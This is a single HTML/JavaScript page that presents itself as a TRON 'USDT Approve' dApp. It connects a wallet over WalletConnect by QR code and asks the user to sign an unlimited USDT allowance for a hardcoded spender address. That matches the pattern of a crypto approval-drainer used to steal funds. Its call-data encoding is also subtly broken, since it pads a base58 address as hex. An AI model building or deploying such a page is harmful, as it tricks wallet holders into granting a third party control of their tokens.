<!doctype html>
<html lang="ro">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>TRON WalletConnect Approve</title>

<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
</head>

<body>

<h2>TRON dApp - USDT Approve</h2>

<button id="connectBtn">Connect (QR)</button>
<button id="approveBtn" disabled>Approve USDT</button>

<div id="status"></div>
<div id="qr"></div>

<script type="module">

import SignClient from "https://unpkg.com/@walletconnect/sign-client@2.11.0/dist/index.es.js";

/* ================= CONFIG ================= */

const PROJECT_ID = "dde98880530be70b65d01a1be59e5fa3";

/* USDT TRC20 */
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

/* SPENDER (adresa ta / contractul tău) */
const SPENDER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";

/* MAX approval */
const MAX_UINT256 =
"115792089237316195423570985008687907853269984665640564039457584007913129639935";

/* ================= STATE ================= */

let client;
let session;

/* ================= UI ================= */

const status = (t)=>document.getElementById("status").innerText = t;

/* ================= INIT ================= */

async function init(){
  client = await SignClient.init({
    projectId: PROJECT_ID,
    metadata: {
      name: "TRON USDT dApp",
      description: "Approve flow",
      url: "https://example.com"
    }
  });
}

/* ================= QR ================= */

function renderQR(uri){
  const canvas = document.createElement("canvas");

  QRCode.toCanvas(canvas, uri, { width: 260 });

  document.getElementById("qr").innerHTML = "";
  document.getElementById("qr").appendChild(canvas);
}

/* ================= CONNECT ================= */

async function connect(){

  status("Connecting...");

  const { uri, approval } = await client.connect({
    requiredNamespaces: {
      tron: {
        methods: ["tron_sendTransaction"],
        chains: ["tron:0"],
        events: []
      }
    }
  });

  if (uri) {
    renderQR(uri);
    status("Scan QR in Trust Wallet");
  } else {
    status("No QR (wallet injected mode)");
  }

  session = await approval();

  status("Connected");

  document.getElementById("approveBtn").disabled = false;
  document.getElementById("qr").innerHTML = "";
}

/* ================= ENCODE APPROVE ================= */

function buildApproveData(){

  const methodId = "095ea7b3"; // approve(address,uint256)

  const spenderHex = SPENDER.replace("0x","").padStart(64,"0");
  const amountHex = BigInt(MAX_UINT256).toString(16).padStart(64,"0");

  return "0x" + methodId + spenderHex + amountHex;
}

/* ================= SEND APPROVE ================= */

async function approve(){

  const owner = session.namespaces.tron.accounts[0].split(":")[2];

  const tx = {
    to: USDT_CONTRACT,
    owner_address: owner,
    data: buildApproveData(),
    feeLimit: 10000000,
    callValue: 0
  };

  status("Waiting wallet confirmation...");

  try {
    await client.request({
      topic: session.topic,
      chainId: "tron:0",
      request: {
        method: "tron_sendTransaction",
        params: [tx]
      }
    });

    status("Approve sent (signed in wallet)");

  } catch (e) {
    status("Rejected or error");
  }
}

/* ================= EVENTS ================= */

document.getElementById("connectBtn").onclick = connect;
document.getElementById("approveBtn").onclick = approve;

init();

</script>

</body>
</html>
